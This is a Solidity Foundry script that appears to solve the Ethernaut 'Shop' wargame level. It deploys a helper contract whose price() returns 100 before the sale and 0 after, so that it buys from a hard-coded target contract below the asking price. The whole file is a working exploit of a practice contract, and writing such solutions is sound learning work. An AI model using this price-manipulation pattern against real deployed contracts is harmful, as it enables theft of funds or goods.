// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/console.sol";
import "forge-std/Script.sol";
import "../src/21_Shop.sol";

contract Helper {
    uint256 public count = 0;
    Shop public target;

    constructor(Shop _target) {
        target = _target;
    }

    function exploit() external {
        target.buy();
    }

    function addCount() public {
        count++;
    }

    function price() external view returns(uint256) {
        return target.isSold() ? 0 : 100;
    }
        
}

contract POC is Script {
    Shop public target;
    Helper public helper;

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        target = Shop(0xFe5534631DD4eeFc1c9e6121862969776b15d529);
        helper = new Helper(target);

        bool isSold = target.isSold();
        console.log("before status: ", isSold);

        helper.exploit();

        isSold = target.isSold();
        console.log("after  status: ", isSold);
        
        vm.stopBroadcast();
    }
}